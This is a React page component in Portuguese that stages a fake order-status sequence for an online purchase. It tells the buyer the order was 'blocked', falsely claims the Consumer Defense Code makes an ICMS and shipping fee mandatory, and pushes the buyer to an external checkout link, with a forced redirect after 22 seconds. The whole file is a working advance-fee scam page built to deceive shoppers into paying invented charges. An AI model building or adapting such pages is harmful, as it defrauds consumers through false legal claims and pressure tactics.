import { useState, useEffect } from "react";

const CHECKOUT_URL = "https://seguropagamentos.com.br/of3";

const Index = () => {
  const [popup1Visible] = useState(true); // visible immediately
  const [popup2Visible, setPopup2Visible] = useState(false);
  const [popup3Visible, setPopup3Visible] = useState(false);

  useEffect(() => {
    const t2 = setTimeout(() => setPopup2Visible(true), 3500);
    const t3 = setTimeout(() => setPopup3Visible(true), 8000);
    const redirect = setTimeout(() => {
      window.location.href = CHECKOUT_URL;
    }, 22000);

    return () => {
      clearTimeout(t2);
      clearTimeout(t3);
      clearTimeout(redirect);
    };
  }, []);

  const popupBase: React.CSSProperties = {
    position: "fixed",
    left: "50%",
    transform: "translateX(-50%)",
    width: "90%",
    maxWidth: "400px",
    padding: "20px",
    backgroundColor: "#fff",
    borderRadius: "10px",
    boxShadow: "0 4px 8px rgba(0, 0, 0, 0.2)",
    transition: "all 0.5s ease",
    zIndex: 999,
  };

  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        minHeight: "100vh",
        backgroundColor: "#f3f4f6",
        overflow: "hidden",
        position: "relative",
      }}
    >
      {/* Title */}
      <h2
        style={{
          position: "fixed",
          top: "12vw",
          left: "50%",
          transform: "translateX(-50%)",
          width: "90%",
          textAlign: "center",
          color: "#000",
          fontFamily: "'Roboto', sans-serif",
          fontWeight: 600,
          fontSize: "4.1vw",
          margin: 0,
          zIndex: 1000,
        }}
      >
        ACOMPANHE O STATUS DO SEU PEDIDO:
      </h2>

      {/* Popup 1 */}
      <div style={{ ...popupBase, top: "26%", opacity: popup1Visible ? 1 : 0 }}>
        <h2 style={{ fontSize: "1.2rem", margin: 0 }}>Pedido sendo processado</h2>
        <p style={{ fontSize: "0.9rem", color: "#555", margin: "8px 0 0" }}>
          Aguarde um momento...
        </p>
      </div>

      {/* Popup 2 */}
      <div style={{ ...popupBase, top: "44%", opacity: popup2Visible ? 1 : 0 }}>
        <h2 style={{ fontSize: "1.2rem", margin: 0 }}>Seu Pedido foi barrado ❌</h2>
        <p style={{ fontSize: "0.9rem", color: "#555", margin: "8px 0 0" }}>
          Estamos verificando as informações...
        </p>
      </div>

      {/* Popup 3 */}
      <div style={{ ...popupBase, top: "64%", opacity: popup3Visible ? 1 : 0 }}>
        <h2 style={{ fontSize: "1.2rem", margin: 0, color: "red" }}>
          Pagamento obrigatório do ICMS
        </h2>
        <p style={{ fontSize: "0.9rem", color: "#555", margin: "8px 0 12px" }}>
          De acordo com o Código de Defesa do Consumidor, para que sua compra seja
          processada e o produto despachado, é OBRIGATÓRIO o pagamento da Taxa de
          Envio e Processamento.
        </p>
        <button
          onClick={() => {
            window.location.href = CHECKOUT_URL;
          }}
          style={{
            display: "block",
            width: "80%",
            backgroundColor: "#4CAF50",
            color: "#fff",
            padding: "10px 18px",
            border: "none",
            borderRadius: "8px",
            cursor: "pointer",
            fontSize: "1rem",
            textAlign: "center",
            margin: "0 auto",
          }}
        >
          LIBERAR PRODUTO
        </button>
        <small
          style={{
            fontSize: "0.8rem",
            color: "#888",
            display: "block",
            marginTop: "5px",
            textAlign: "center",
          }}
        >
          <span style={{ fontWeight: "bold" }}>
            (Sem o pagamento da Taxa de Envio, seu produto NÃO será liberado!)
          </span>
        </small>
      </div>
    </div>
  );
};

export default Index;
